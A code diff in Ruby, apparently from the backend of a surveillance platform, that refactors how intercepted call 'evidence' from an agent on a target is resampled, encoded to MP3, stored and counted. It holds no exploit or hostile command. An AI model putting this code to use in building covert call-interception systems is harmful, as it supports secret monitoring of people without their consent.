@@ -36,7 +36,7 @@ class Channel
     @start_time = evidence[:data][:start_time]
     @written_samples = 0
     @needs_resampling = @sample_rate
-    @resampled = false
+    #@resampled = false
     @wav_data = Array.new # array of 32 bit float samples
     @status = :open
     trace :debug, "[channel #{to_s}] ceating new channel #{@name} - start_time: #{@start_time} sample_rate: #{@sample_rate}"
@@ -59,9 +59,11 @@ class Channel
     @status == :closed
   end
 
+=begin
   def resampled?
     @resampled
   end
+=end
 
   def needs_resampling?
     @needs_resampling != @sample_rate
@@ -72,7 +74,8 @@ class Channel
     @needs_resampling = sample_rate
     trace :debug, "[channel #{to_s}] resampling channel from #{@sample_rate} to #{@needs_resampling}"
     @wav_data = SRC::Resampler.new(@needs_resampling).resample_channel(@wav_data, @sample_rate)
-    @resampled = true
+    #@resampled = true
+    @written_samples = @wav_data.size
   end
 
   def resample(evidence)
@@ -226,7 +229,7 @@ class Call
   def close!
     # TODO: flush channels if samples queued
     @channels.each_value {|c| c.close!}
-    update_attributes("data.status" => :completed) #unless @evidence.nil?
+    update_data({status: :completed}) #unless @evidence.nil?
     trace :debug, "[CALL #{@id}] closing call for #{@peer}, starting at #{@start_time}"
     true
   end
@@ -316,14 +319,14 @@ class Call
     end
   end
 
-  def update_attributes(hash)
-    @evidence.update_attributes(hash) unless @evidence.nil?
+  def update_data(hash)
+    @evidence.update_attributes(@evidence.data.merge!(hash)) unless @evidence.nil?
   end
 
   def store(peer, program, start_time, agent, target)
 
-    evidence = ::Evidence.collection_class(target[:_id].to_s)
-    evidence.create do |ev|
+    coll = ::Evidence.collection_class(target[:_id].to_s)
+    coll.create do |ev|
       ev._id = @bid
       ev.aid = agent[:_id].to_s
       ev.type = :call
@@ -339,11 +342,14 @@ class Call
       ev.data[:program] = program
       ev.data[:duration] = 0
       ev.data[:status] = :recording
-      
-      ev.save
-      return ev
-    end
 
+      # update the evidence statistics
+      # TODO: where do we add the size to the stats? (probably in the same place where we will forward to connectors)
+      RCS::Worker::StatsManager.instance.add evidence: 1
+
+      ev.save
+      ev
+    end
   end
   
   def file_name
@@ -379,9 +385,7 @@ end
 class CallProcessor
   include Tracer
 
-  def initialize(agent, target)
-    @agent = agent
-    @target = target
+  def initialize
     @call = nil
   end
 
@@ -399,7 +403,7 @@ class CallProcessor
     return @call if @call.accept? evidence and not @call.closed?
 
     # otherwise, close the call
-    close_call {|evidence| yield evidence}
+    close_call
     @call = create_call(evidence)
     @call
   end
@@ -418,14 +422,17 @@ class CallProcessor
     evidence[:end_call]
   end
   
-  def feed(evidence)
+  def feed(evidence, agent, target)
+    @agent = agent
+    @target = target
+
     if end_call? evidence
       close_call {|evidence| yield evidence}
       @call = nil
       return nil, 0
     end
     
-    call = get_call(evidence) {|evidence| yield evidence}
+    call = get_call(evidence)
     return nil if call.nil?
     
     call.feed evidence do |sample_rate, left_pcm, right_pcm|
@@ -452,9 +459,7 @@ class CallProcessor
 
     fs.open(call.file_name, 'a') do |f|
       f.write mp3_bytes
-      call.update_attributes("data.duration" => call.duration)
-      call.update_attributes("data._grid" => f.files_id)
-      call.update_attributes("data._grid_size" => f.file_length)
+      call.update_data({_grid: f.files_id, _grid_size: f.file_length, duration: call.duration})
     end
   end
 
